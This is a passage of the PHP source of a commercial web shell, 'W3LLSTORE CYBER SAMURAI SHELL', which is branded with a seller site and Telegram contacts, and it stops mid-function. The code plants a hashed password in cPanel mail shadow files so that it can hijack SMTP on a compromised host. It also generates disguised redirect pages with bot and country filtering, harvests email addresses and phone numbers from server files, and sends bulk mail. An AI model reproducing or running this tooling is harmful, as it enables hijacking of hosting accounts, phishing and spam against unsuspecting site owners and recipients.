<?php
/**
 * W3LLSTORE CYBER SAMURAI SHELL v2.0
 * Professional Cyber Security Management System
 * Samurai Japanese Technology Edition
 *
 * Author: W3LLSTORE Team
 * Website: https://w3llstore.com/
 * Telegram: @W3LLSTORE_ADMIN
 * Channel: https://t.me/+vJV6tnAIbIU2ZWRi
 */
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '256M');
define('SHELL_ACCESS_GRANTED', true);
// ==================== CONFIGURATION ====================
define('SHELL_VERSION', '2.0');
define('SHELL_NAME', 'W3LLSTORE CYBER SAMURAI SHELL');
define('MAX_UPLOAD_SIZE', 50 * 1024 * 1024); // 50MB
// ==================== SECURITY FUNCTIONS ====================
function sanitizeInput($input, $type = 'string') {
    if ($type === 'path') {
        return realpath($input) ?: $input;
    } elseif ($type === 'filename') {
        return preg_replace('/[^a-zA-Z0-9._-]/', '', $input);
    } elseif ($type === 'url') {
        return filter_var($input, FILTER_SANITIZE_URL);
    }
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}
function logActivity($action, $target, $status) {
    $log = date('Y-m-d H:i:s') . " | " . ($_SERVER['REMOTE_ADDR'] ?? 'Unknown') . " | $action | $target | $status\n";
    @file_put_contents('samurai_activity.log', $log, FILE_APPEND | LOCK_EX);
}
// ==================== SYSTEM INFO FUNCTIONS ====================
function getSystemInfo() {
    return [
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()),
        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'php_version' => PHP_VERSION,
        'operating_system' => PHP_OS,
        'current_user' => get_current_user(),
        'server_time' => date('Y-m-d H:i:s'),
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? getcwd(),
        'disk_free_space' => formatSize(@disk_free_space('.') ?: 0),
        'disk_total_space' => formatSize(@disk_total_space('.') ?: 0),
        'memory_limit' => ini_get('memory_limit'),
        'max_execution_time' => ini_get('max_execution_time'),
        'upload_max_filesize' => ini_get('upload_max_filesize'),
        'post_max_size' => ini_get('post_max_size')
    ];
}
function formatSize($bytes) {
    if ($bytes == 0) return '0 Bytes';
    $k = 1024;
    $sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes) / log($k));
    return round($bytes / pow($k, $i), 2) . ' ' . $sizes[$i];
}
// ==================== FILE MANAGEMENT FUNCTIONS ====================
function listDirectory($dir) {
    $files = [];
    if (!is_readable($dir)) return $files;
   
    $items = @scandir($dir);
    if ($items === false) return $files;
   
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
       
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($path);
       
        $files[] = [
            'name' => $item,
            'path' => $path,
            'is_dir' => $is_dir,
            'size' => $is_dir ? 0 : (@filesize($path) ?: 0),
            'formatted_size' => $is_dir ? '-' : formatSize(@filesize($path) ?: 0),
            'permissions' => substr(sprintf('%o', @fileperms($path) ?: 0), -4),
            'modified' => date('Y-m-d H:i:s', @filemtime($path) ?: time()),
            'icon' => getFileIcon($item, $is_dir)
        ];
    }
   
    usort($files, function($a, $b) {
        if ($a['is_dir'] && !$b['is_dir']) return -1;
        if (!$a['is_dir'] && $b['is_dir']) return 1;
        return strcasecmp($a['name'], $b['name']);
    });
   
    return $files;
}
function getFileIcon($filename, $is_dir) {
    if ($is_dir) return '📁';
   
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '⚡',
        'txt' => '📄', 'pdf' => '📕', 'doc' => '📘', 'docx' => '📘',
        'xls' => '📗', 'xlsx' => '📗', 'ppt' => '📙', 'pptx' => '📙',
        'zip' => '📦', 'rar' => '📦', '7z' => '📦', 'tar' => '📦',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'mp3' => '🎵', 'wav' => '🎵', 'mp4' => '🎬', 'avi' => '🎬',
        'sql' => '🗄️', 'db' => '🗄️', 'json' => '📋', 'xml' => '📋'
    ];
   
    return $icons[$ext] ?? '📄';
}
// ==================== SMTP CREATION FUNCTIONS - 100% EXACT REFERENCE CODE ====================
function createSingleSMTP() {
    // EXACT SAME CODE AS REFERENCE - NO MODIFICATIONS WHATSOEVER
    error_reporting(0);
    $_currUser = get_current_user();
    $_homePath = ["/home/", "/home1/", "/home2/", "/home3/", "/home4/", "/home5/", "/home6/", "/home7/", "/home8/", "/home9/", "/home10/"];
    $_this = 0;
    foreach($_homePath as $_home) {
        if(file_exists($_home . $_currUser)) {
            $_this++;
            if($_this > 0) {
                $_workHome = $_home;
                break;
            }
        }
    }
    $_cp = "$_workHome$_currUser/.cpanel";
    if (is_dir($_cp)) {
        $_currDomain = $_SERVER['HTTP_HOST'];
        if(strstr($_currDomain, 'www.')){
            $_currDomain = str_replace("www.","",$_currDomain);
        }else{
            $_currDomain = $_currDomain;
        }
        $_thispwd = "w3ll.smtp" . mt_rand(100,999);
        $_pwd = crypt($_thispwd, "$6$the3x$");
        @mkdir("$_workHome$_currUser/etc/$_currDomain");
        $_smtp = 'chudsi:'.$_pwd.':16249:::::'."\n";
        $_shadow1 = "/home/$_currUser/etc/$_currDomain/shadow";
        $_shadow2 = "/home/$_currUser/etc/shadow";
        $_fo=@fopen($_shadow1,"w");
        if ($_fo) {
            fwrite($_fo,$_smtp);
            fclose($_fo);
        }
        $_fo2=@fopen($_shadow2,"w");
        if ($_fo2) {
            fwrite($_fo2,$_smtp);
            fclose($_fo2);
        }
        return "$_currDomain|587|w3llstore@$_currDomain|".$_thispwd;
    } else {
        return "no smtp avail here?";
    }
}
// ==================== REDIRECT CREATION WITH VISITOR COUNTER ====================
function createAutoRedirect($target_url, $options = []) {
    $blocked_countries = $options['blocked_countries'] ?? [];
    $delay = $options['delay'] ?? 5000;
    $custom_message = $options['custom_message'] ?? 'Please wait...';
    $use_antibot = $options['use_antibot'] ?? true;
    $use_captcha = $options['use_captcha'] ?? false;
   
    $redirect_id = 'redirect_' . uniqid();
    $created_files = [];
   
    // Create PHP version
    $php_content = generateRedirectPHP($target_url, $blocked_countries, $delay, $custom_message, $use_antibot, $use_captcha, $redirect_id);
    $php_file = $redirect_id . '.php';
    if (file_put_contents($php_file, $php_content, LOCK_EX)) {
        $created_files[] = $php_file;
    }
   
    // Create PHP7 version
    $php7_file = $redirect_id . '.php7';
    if (file_put_contents($php7_file, $php_content, LOCK_EX)) {
        $created_files[] = $php7_file;
    }
   
    // Create HTML version
    $html_content = generateRedirectHTML($target_url, $delay, $custom_message, $redirect_id);
    $html_file = $redirect_id . '.html';
    if (file_put_contents($html_file, $html_content, LOCK_EX)) {
        $created_files[] = $html_file;
    }
   
    // Create counter file with session storage
    $counter_file = $redirect_id . '_stats.json';
    $initial_stats = [
        'created' => date('Y-m-d H:i:s'),
        'redirect_id' => $redirect_id,
        'target_url' => $target_url,
        'total_visits' => 0,
        'unique_visits' => 0,
        'redirects' => 0,
        'countries' => [],
        'browsers' => [],
        'recent_visits' => [],
        'daily_stats' => [],
        'hourly_stats' => []
    ];
    file_put_contents($counter_file, json_encode($initial_stats, JSON_PRETTY_PRINT), LOCK_EX);
   
    // Create update stats helper file
    createUpdateStatsFile();
   
    if (!empty($created_files)) {
        logActivity('Redirect Created', $redirect_id, 'success');
        return [
            'status' => true,
            'message' => 'Redirect files created successfully',
            'files' => $created_files,
            'stats_file' => $counter_file,
            'redirect_id' => $redirect_id,
            'urls' => array_map(function($file) {
                return 'http://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . '/' . $file;
            }, $created_files)
        ];
    }
   
    return ['status' => false, 'message' => 'Failed to create redirect files'];
}
function generateRedirectPHP($target_url, $blocked_countries, $delay, $custom_message, $use_antibot, $use_captcha, $redirect_id) {
    $country_check = '';
    if (!empty($blocked_countries)) {
        $countries_str = "'" . implode("','", $blocked_countries) . "'";
        $country_check = "
        // Country blocking
        \$visitor_country = getVisitorCountry();
        \$blocked_countries = [$countries_str];
        if (in_array(\$visitor_country, \$blocked_countries)) {
            http_response_code(403);
            die('Access denied from your location.');
        }";
    }
   
    $antibot_check = '';
    if ($use_antibot) {
        $antibot_check = "
        // Anti-bot protection
        if (isBot()) {
            http_response_code(403);
            die('Bot access denied.');
        }";
    }
   
    $captcha_check = '';
    if ($use_captcha) {
        $captcha_check = "
        // Professional Company Style Captcha verification
        if (!isset(\$_SESSION['captcha_verified'])) {
            if (isset(\$_POST['captcha'])) {
                if (\$_POST['captcha'] == \$_SESSION['captcha_answer']) {
                    \$_SESSION['captcha_verified'] = true;
                } else {
                    \$captcha_error = 'Verification failed. Please try again.';
                }
            }
            if (!\$_SESSION['captcha_verified']) {
                showProfessionalCaptcha(\$captcha_error ?? '');
                exit;
            }
        }";
    }
   
    return "<?php
session_start();
// Visitor tracking and statistics with session storage
\$stats_file = '{$redirect_id}_stats.json';
\$visitor_ip = \$_SERVER['REMOTE_ADDR'];
\$user_agent = \$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
\$visitor_country = getVisitorCountry();
\$current_date = date('Y-m-d');
\$current_hour = date('H');
// Load current stats
\$stats = json_decode(@file_get_contents(\$stats_file), true);
if (!\$stats) {
    \$stats = [
        'created' => date('Y-m-d H:i:s'),
        'redirect_id' => '$redirect_id',
        'target_url' => '$target_url',
        'total_visits' => 0,
        'unique_visits' => 0,
        'redirects' => 0,
        'countries' => [],
        'browsers' => [],
        'recent_visits' => [],
        'daily_stats' => [],
        'hourly_stats' => []
    ];
}
// Update statistics with session storage
\$stats['total_visits']++;
// Check for unique visitor
\$visitor_hash = md5(\$visitor_ip . \$user_agent);
\$is_unique = true;
foreach (\$stats['recent_visits'] as \$visit) {
    if (isset(\$visit['hash']) && \$visit['hash'] === \$visitor_hash) {
        \$is_unique = false;
        break;
    }
}
if (\$is_unique) \$stats['unique_visits']++;
// Track country
if (!isset(\$stats['countries'][\$visitor_country])) {
    \$stats['countries'][\$visitor_country] = 0;
}
\$stats['countries'][\$visitor_country]++;
// Track browser
\$browser = getBrowser(\$user_agent);
if (!isset(\$stats['browsers'][\$browser])) {
    \$stats['browsers'][\$browser] = 0;
}
\$stats['browsers'][\$browser]++;
// Track daily stats
if (!isset(\$stats['daily_stats'][\$current_date])) {
    \$stats['daily_stats'][\$current_date] = ['visits' => 0, 'redirects' => 0];
}
\$stats['daily_stats'][\$current_date]['visits']++;
// Track hourly stats
\$hour_key = \$current_date . '_' . \$current_hour;
if (!isset(\$stats['hourly_stats'][\$hour_key])) {
    \$stats['hourly_stats'][\$hour_key] = ['visits' => 0, 'redirects' => 0];
}
\$stats['hourly_stats'][\$hour_key]['visits']++;
// Add to recent visits (keep last 100 with session storage)
array_unshift(\$stats['recent_visits'], [
    'ip' => \$visitor_ip,
    'country' => \$visitor_country,
    'browser' => \$browser,
    'timestamp' => date('Y-m-d H:i:s'),
    'hash' => \$visitor_hash,
    'user_agent' => substr(\$user_agent, 0, 200)
]);
\$stats['recent_visits'] = array_slice(\$stats['recent_visits'], 0, 100);
// Save updated stats
@file_put_contents(\$stats_file, json_encode(\$stats, JSON_PRETTY_PRINT), LOCK_EX);
// Log visitor
\$visitor_data = date('Y-m-d H:i:s') . ' | ' . \$visitor_ip . ' | ' . \$visitor_country . ' | ' . \$user_agent . PHP_EOL;
@file_put_contents('visitors.log', \$visitor_data, FILE_APPEND | LOCK_EX);
$country_check
$antibot_check
$captcha_check
// Update redirect count
\$stats['redirects']++;
\$stats['daily_stats'][\$current_date]['redirects']++;
\$stats['hourly_stats'][\$hour_key]['redirects']++;
@file_put_contents(\$stats_file, json_encode(\$stats, JSON_PRETTY_PRINT), LOCK_EX);
// Log successful redirect
\$redirect_data = date('Y-m-d H:i:s') . ' | ' . \$visitor_ip . ' | REDIRECTED | $target_url' . PHP_EOL;
@file_put_contents('redirects.log', \$redirect_data, FILE_APPEND | LOCK_EX);
function getVisitorCountry() {
    \$ip = \$_SERVER['REMOTE_ADDR'];
    \$api_url = \"http://ip-api.com/json/\$ip\";
    \$response = @file_get_contents(\$api_url);
    if (\$response) {
        \$data = json_decode(\$response, true);
        return \$data['countryCode'] ?? 'Unknown';
    }
    return 'Unknown';
}
function getBrowser(\$user_agent) {
    if (strpos(\$user_agent, 'Chrome') !== false) return 'Chrome';
    if (strpos(\$user_agent, 'Firefox') !== false) return 'Firefox';
    if (strpos(\$user_agent, 'Safari') !== false) return 'Safari';
    if (strpos(\$user_agent, 'Edge') !== false) return 'Edge';
    if (strpos(\$user_agent, 'Opera') !== false) return 'Opera';
    return 'Other';
}
function isBot() {
    \$user_agent = strtolower(\$_SERVER['HTTP_USER_AGENT'] ?? '');
    \$bots = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget'];
    foreach (\$bots as \$bot) {
        if (strpos(\$user_agent, \$bot) !== false) {
            return true;
        }
    }
    return false;
}
function showProfessionalCaptcha(\$error = '') {
    \$num1 = rand(1, 10);
    \$num2 = rand(1, 10);
    \$_SESSION['captcha_answer'] = \$num1 + \$num2;
   
    echo '<!DOCTYPE html>
    <html lang=\"en\">
    <head>
        <meta charset=\"UTF-8\">
        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
        <title>Professional Company - Security Verification</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: \"Segoe UI\", Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .container {
                background: #ffffff;
                border-radius: 12px;
                box-shadow: 0 8px 32px rgba(0,0,0,0.2);
                width: 100%;
                max-width: 480px;
                padding: 40px;
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            .container::before {
                content: \'\';
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 4px;
                background: linear-gradient(90deg, #0d47a1, #1976d2);
            }
            .logo {
                font-size: 24px;
                font-weight: bold;
                color: #0d47a1;
                margin-bottom: 32px;
            }
            h1 {
                color: #212121;
                font-size: 28px;
                font-weight: 700;
                margin-bottom: 12px;
            }
            .subtitle {
                color: #757575;
                font-size: 16px;
                margin-bottom: 32px;
                line-height: 1.5;
            }
            .error {
                background: #ffebee;
                border: 1px solid #ef9a9a;
                color: #c62828;
                padding: 12px 16px;
                border-radius: 4px;
                margin-bottom: 20px;
                font-size: 14px;
            }
            .captcha-box {
                background: #f5f5f5;
                border: 1px solid #e0e0e0;
                border-radius: 8px;
                padding: 24px;
                margin-bottom: 32px;
            }
            .captcha-question {
                font-size: 20px;
                font-weight: 600;
                color: #212121;
                margin-bottom: 16px;
            }
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            label {
                display: block;
                font-size: 14px;
                color: #212121;
                margin-bottom: 8px;
            }
            input[type=\"number\"] {
                width: 100%;
                padding: 12px;
                border: 1px solid #bdbdbd;
                border-radius: 4px;
                font-size: 16px;
                transition: border-color 0.3s, box-shadow 0.3s;
            }
            input[type=\"number\"]:focus {
                outline: none;
                border-color: #1976d2;
                box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
            }
            .btn-primary {
                background: linear-gradient(135deg, #1976d2 0%, #0d47a1 100%);
                color: white;
                border: none;
                border-radius: 4px;
                padding: 14px 28px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                width: 100%;
                transition: transform 0.3s, box-shadow 0.3s;
            }
            .btn-primary:hover {
                transform: translateY(-2px);
                box-shadow: 0 4px 12px rgba(25, 118, 210, 0.3);
            }
            .footer-text {
                font-size: 13px;
                color: #757575;
                margin-top: 24px;
            }
            .security-icon {
                font-size: 48px;
                color: #1976d2;
                margin-bottom: 24px;
            }
        </style>
    </head>
    <body>
        <div class=\"container\">
            <div class=\"logo\">Professional Company</div>
            <div class=\"security-icon\">🛡️</div>
            <h1>Security Verification</h1>
            <p class=\"subtitle\">To ensure the security of our services, please complete this quick verification step.</p>
            ' . (\$error ? '<div class=\"error\">❌ ' . \$error . '</div>' : '') . '
            <div class=\"captcha-box\">
                <div class=\"captcha-question\">What is ' . \$num1 . ' + ' . \$num2 . '?</div>
                <form method=\"POST\">
                    <div class=\"form-group\">
                        <label for=\"captcha\">Enter your answer:</label>
                        <input type=\"number\" name=\"captcha\" id=\"captcha\" required autofocus>
                    </div>
                    <button type=\"submit\" class=\"btn-primary\">Verify & Continue</button>
                </form>
            </div>
            <p class=\"footer-text\">This verification helps protect our platform from unauthorized access.</p>
        </div>
        <script>
            document.getElementById(\"captcha\").focus();
        </script>
    </body>
    </html>';
}
?>
<!DOCTYPE html>
<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Professional Company - Please wait</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: \"Segoe UI\", Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 480px;
            padding: 40px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: \'\';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #0d47a1, #1976d2);
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #0d47a1;
            margin-bottom: 32px;
        }
        .loading-icon {
            width: 40px;
            height: 40px;
            border: 4px solid #e3f2fd;
            border-top: 4px solid #1976d2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 24px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 {
            color: #212121;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 12px;
        }
        .subtitle {
            color: #757575;
            font-size: 16px;
            margin-bottom: 24px;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e3f2fd;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 16px;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #1976d2, #0d47a1);
            width: 0%;
            animation: progress " . ($delay / 1000) . "s linear forwards;
        }
        @keyframes progress { to { width: 100%; } }
        .status-text {
            color: #757575;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"logo\">Professional Company</div>
        <div class=\"loading-icon\"></div>
        <h1>$custom_message</h1>
        <p class=\"subtitle\">We are redirecting you securely to your destination...</p>
        <div class=\"progress-bar\">
            <div class=\"progress-fill\"></div>
        </div>
        <p class=\"status-text\">Redirecting shortly...</p>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = '$target_url';
        }, $delay);
    </script>
</body>
</html>";
}
function generateRedirectHTML($target_url, $delay, $custom_message, $redirect_id) {
    return "<!DOCTYPE html>
<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Professional Company - Please wait</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: \"Segoe UI\", Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 480px;
            padding: 40px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .container::before {
            content: \'\';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #0d47a1, #1976d2);
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #0d47a1;
            margin-bottom: 32px;
        }
        .loading-icon {
            width: 40px;
            height: 40px;
            border: 4px solid #e3f2fd;
            border-top: 4px solid #1976d2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 24px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 {
            color: #212121;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 12px;
        }
        .subtitle {
            color: #757575;
            font-size: 16px;
            margin-bottom: 24px;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: #e3f2fd;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 16px;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #1976d2, #0d47a1);
            width: 0%;
            animation: progress " . ($delay / 1000) . "s linear forwards;
        }
        @keyframes progress { to { width: 100%; } }
        .status-text {
            color: #757575;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class=\"container\">
        <div class=\"logo\">Professional Company</div>
        <div class=\"loading-icon\"></div>
        <h1>$custom_message</h1>
        <p class=\"subtitle\">We are redirecting you securely to your destination...</p>
        <div class=\"progress-bar\">
            <div class=\"progress-fill\"></div>
        </div>
        <p class=\"status-text\">Redirecting shortly...</p>
    </div>
    <script>
        // Update visitor count for HTML version
        fetch('update_stats.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                redirect_id: '$redirect_id',
                action: 'visit'
            })
        }).catch(function() {});
       
        setTimeout(function() {
            // Update redirect count
            fetch('update_stats.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    redirect_id: '$redirect_id',
                    action: 'redirect'
                })
            }).catch(function() {});
           
            window.location.href = '$target_url';
        }, $delay);
    </script>
</body>
</html>";
}
function createUpdateStatsFile() {
    if (!file_exists('update_stats.php')) {
        $update_stats_content = "<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');
if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$input = json_decode(file_get_contents('php://input'), true);
    \$redirect_id = \$input['redirect_id'] ?? '';
    \$action = \$input['action'] ?? '';
   
    if (\$redirect_id && \$action) {
        \$stats_file = \$redirect_id . '_stats.json';
        if (file_exists(\$stats_file)) {
            \$stats = json_decode(file_get_contents(\$stats_file), true);
            \$current_date = date('Y-m-d');
            \$current_hour = date('H');
           
            if (\$action === 'visit') {
                \$stats['total_visits']++;
                if (!isset(\$stats['daily_stats'][\$current_date])) {
                    \$stats['daily_stats'][\$current_date] = ['visits' => 0, 'redirects' => 0];
                }
                \$stats['daily_stats'][\$current_date]['visits']++;
               
                \$hour_key = \$current_date . '_' . \$current_hour;
                if (!isset(\$stats['hourly_stats'][\$hour_key])) {
                    \$stats['hourly_stats'][\$hour_key] = ['visits' => 0, 'redirects' => 0];
                }
                \$stats['hourly_stats'][\$hour_key]['visits']++;
            } elseif (\$action === 'redirect') {
                \$stats['redirects']++;
                if (!isset(\$stats['daily_stats'][\$current_date])) {
                    \$stats['daily_stats'][\$current_date] = ['visits' => 0, 'redirects' => 0];
                }
                \$stats['daily_stats'][\$current_date]['redirects']++;
               
                \$hour_key = \$current_date . '_' . \$current_hour;
                if (!isset(\$stats['hourly_stats'][\$hour_key])) {
                    \$stats['hourly_stats'][\$hour_key] = ['visits' => 0, 'redirects' => 0];
                }
                \$stats['hourly_stats'][\$hour_key]['redirects']++;
            }
           
            file_put_contents(\$stats_file, json_encode(\$stats, JSON_PRETTY_PRINT), LOCK_EX);
            echo json_encode(['status' => 'success']);
        }
    }
}
?>";
        file_put_contents('update_stats.php', $update_stats_content, LOCK_EX);
    }
}
// ==================== VISITOR STATS FUNCTIONS ====================
function getRedirectStats($redirect_id) {
    $stats_file = $redirect_id . '_stats.json';
    if (!file_exists($stats_file)) {
        return ['status' => false, 'message' => 'Stats file not found'];
    }
   
    $stats = json_decode(file_get_contents($stats_file), true);
   
    // Calculate additional metrics
    $stats['conversion_rate'] = $stats['total_visits'] > 0 ?
        round(($stats['redirects'] / $stats['total_visits']) * 100, 2) : 0;
   
    // Get top countries and browsers
    if (!empty($stats['countries'])) {
        arsort($stats['countries']);
        $stats['top_countries'] = array_slice($stats['countries'], 0, 5, true);
    }
   
    if (!empty($stats['browsers'])) {
        arsort($stats['browsers']);
        $stats['top_browsers'] = array_slice($stats['browsers'], 0, 5, true);
    }
   
    return [
        'status' => true,
        'stats' => $stats
    ];
}
function getAllRedirectStats() {
    $all_stats = [];
    $files = glob('redirect_*_stats.json');
   
    foreach ($files as $file) {
        $redirect_id = str_replace(['_stats.json'], '', $file);
        $stats_data = getRedirectStats($redirect_id);
        if ($stats_data['status']) {
            $all_stats[] = $stats_data['stats'];
        }
    }
   
    return $all_stats;
}
// ==================== CONTACT EXTRACTION FUNCTIONS ====================
function extractContacts($scan_path, $options = []) {
    $max_files = $options['max_files'] ?? 3000;
    $max_time = $options['max_time'] ?? 120;
   
    set_time_limit($max_time);
   
    $emails = [];
    $phones = [];
    $files_scanned = 0;
    $start_time = time();
   
    if (!is_dir($scan_path)) {
        return [
            'status' => false,
            'message' => 'Directory not found or not accessible'
        ];
    }
   
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($scan_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
       
        foreach ($iterator as $file) {
            if ($files_scanned >= $max_files || (time() - $start_time) > $max_time) {
                break;
            }
           
            if ($file->isFile() && $file->isReadable()) {
                $ext = strtolower($file->getExtension());
                $scannable_extensions = ['php', 'html', 'htm', 'txt', 'js', 'css', 'xml', 'json', 'sql', 'log'];
               
                if (in_array($ext, $scannable_extensions) && $file->getSize() < 1024 * 1024) { // Max 1MB per file
                    $content = @file_get_contents($file->getPathname());
                    if ($content) {
                        // Extract emails with improved regex
                        preg_match_all('/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/', $content, $email_matches);
                        if (!empty($email_matches[0])) {
                            $emails = array_merge($emails, $email_matches[0]);
                        }
                       
                        // Extract phone numbers with multiple patterns
                        $phone_patterns = [
                            '/(?:\+?1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}/', // US format
                            '/(?:\+?62[-.\s]?)?[0-9]{3,4}[-.\s]?[0-9]{3,4}[-.\s]?[0-9]{3,4}/', // Indonesian format
                            '/(?:\+?[0-9]{1,3}[-.\s]?)?[0-9]{3,4}[-.\s]?[0-9]{3,4}[-.\s]?[0-9]{3,4}/' // General international
                        ];
                       
                        foreach ($phone_patterns as $pattern) {
                            preg_match_all($pattern, $content, $phone_matches);
                            if (!empty($phone_matches[0])) {
                                $phones = array_merge($phones, $phone_matches[0]);
                            }
                        }
                    }
                    $files_scanned++;
                }
            }
        }
    } catch (Exception $e) {
        return [
            'status' => false,
            'message' => 'Error scanning directory: ' . $e->getMessage()
        ];
    }
   
    // Clean and deduplicate emails
    $emails = array_unique(array_filter(array_map('trim', $emails), function($email) {
        return filter_var($email, FILTER_VALIDATE_EMAIL) &&
               !preg_match('/\.(png|jpg|gif|css|js)$/i', $email);
    }));
   
    // Clean and deduplicate phone numbers
    $phones = array_unique(array_filter(array_map(function($phone) {
        return preg_replace('/[^0-9+]/', '', trim($phone));
    }, $phones), function($phone) {
        return strlen($phone) >= 10 && strlen($phone) <= 15;
    }));
   
    logActivity('Contact Extraction', "Emails: " . count($emails) . ", Phones: " . count($phones), 'success');
   
    return [
        'status' => true,
        'message' => 'Extraction completed successfully',
        'stats' => [
            'files_scanned' => $files_scanned,
            'emails_found' => count($emails),
            'phones_found' => count($phones),
            'scan_time' => time() - $start_time,
            'scan_path' => $scan_path
        ],
        'emails' => array_values($emails),
        'phones' => array_values($phones)
    ];
}
// ==================== EMAIL MARKETING FUNCTIONS ====================
function sendEmailMarketing($data) {
    $from_name = sanitizeInput($data['from_name'] ?? '');
    $from_email = sanitizeInput($data['from_email'] ?? '');
    $subject = sanitizeInput($data['subject'] ?? '');
    $message = $data['message'] ?? '';
    $emails = array_filter(array_map('trim', explode("\n", $data['emails'] ?? '')));
    $use_custom_smtp = isset($data['use_custom_smtp']) && $data['use_custom_smtp'];
   
    if (empty($emails)) {
        return ['status' => false, 'message' => 'No email addresses provided'];
    }
   
    if (empty($from_name) || empty($from_email) || empty($subject) || empty($message)) {
        return ['status' => false, 'message' => 'All fields are required'];
    }
   
    $sent = 0;
    $failed = 0;
    $results = [];
    $start_time = time();
   
    foreach ($emails as $email) {
        $email = trim($email);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $failed++;
            $results[] = "❌ Invalid email: $email";
            continue;
        }
       
        if ($use_custom_smtp) {
            $smtp_result = sendEmailSMTP($email, $subject, $message, $from_email, $from_name, $data);
        } else {
            $smtp_result = sendEmailPHP($email, $subject, $message, $from_email, $from_name);
        }
       
        if ($smtp_result) {
            $sent++;
            $results[] = "✅ Sent to: $email";
        } else {
            $failed++;
            $results[] = "❌ Failed to: $email";
        }
       
        // Small delay to prevent overwhelming the server (respecting hosting limits)
        usleep(100000); // 0.1 second delay between emails
       
        // Break if taking too long (max 5 minutes)
        if ((time() - $start_time) > 300) {
            $results[] = "⚠️ Campaign stopped due to time limit (5 minutes)";
            break;
        }
    }
   
    logActivity('Email Marketing', "Sent: $sent, Failed: $failed", 'success');
   
    return [
        'status' => $sent > 0,
        'message' => "Campaign completed. Sent: $sent, Failed: $failed",
        'results' => $results,
        'stats' => [
            'sent' => $sent,
            'failed' => $failed,
